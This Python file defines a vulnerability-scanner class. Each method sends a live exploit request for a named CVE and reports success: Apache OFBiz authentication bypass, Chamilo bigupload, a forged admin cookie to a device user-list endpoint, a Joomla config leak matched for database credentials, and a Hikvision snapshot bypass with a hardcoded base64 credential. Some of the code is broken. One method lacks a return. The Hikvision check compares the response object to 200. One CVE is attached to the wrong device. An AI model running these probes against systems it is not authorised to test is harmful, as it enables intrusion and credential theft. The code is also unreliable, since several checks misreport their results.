import requests
import logging
import re


class VulnScanner:

    # CVE-2023-51467 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51467
    # CVE-2023-49070 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49070

    @staticmethod
    def apache_ofbiz_authentication_bypass(url: str) -> bool:
        try:
            target = url + "/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y"
            response = requests.get(target, verify=False, timeout=10)

            if "PONG" in response.text:
                return True

            else:
                return False

        except Exception as e:
            logging.error(e)


    #CVE-2023-4220 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220

    @staticmethod
    def chamilo_lms_unauthenticated_big_upload_rce(url: str) -> bool:
        try:
            target_url = url + "/main/inc/lib/javascript/bigupload/files/"
            response = requests.get(target_url, verify=False, timeout=10)

            if response.status_code == 200:
                return True

            else:
                False

        except Exception as e:
            logging.error(e)


    #CVE-2018-9995 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9995

    @staticmethod
    def DLink_DIR850L(url: str) -> bool:

        host = url.split("//")[1].split("/")[0]

        headers = {"Host": host, "User-Agent": "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-AR,en-US;q=0.7,en;q=0.3", "Content-Type": "text/html", "Cookie": "uid=admin"}

        try:
            target_url = url + "/device.rsp?opt=user&cmd=list"
            response = requests.get(target_url, headers=headers, verify=False, timeout=10)

            if response.status_code == 200:
                return True

            else:
                return False

        except Exception as e:
            logging.error(e)


    #CVE-2023-23752 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23752

    @staticmethod
    def joomla_unauthorized_access(url: str) -> bool:

        regex = re.compile(r'"user":"(.*?)".*?"password":"(.*?)".*?"db":"(.*?)"')

        try:
            target_url = url + "/api/index.php/v1/config/application?public=true"
            response = requests.get(target_url, verify=False, timeout=10)

            if response.status_code == 200:
                mtch = regex.search(response.text)
                if mtch:
                    return True

                else:
                    return False

            else:
                return False

        except Exception as e:
            logging.error(e)


    #CVE-2017-7921 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7921

    @staticmethod
    def access_control_bypass_hikvision(url: str) -> bool:

        headers = {"User-Agent": "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"}

        try:
            target_url = url + "/onvif-http/snapshot?auth=YWRtaW46MTEK"
            response = requests.get(target_url, headers=headers)

            if response == 200:
                return True

            else:
                return False

        except Exception as e:
            logging.error(e)
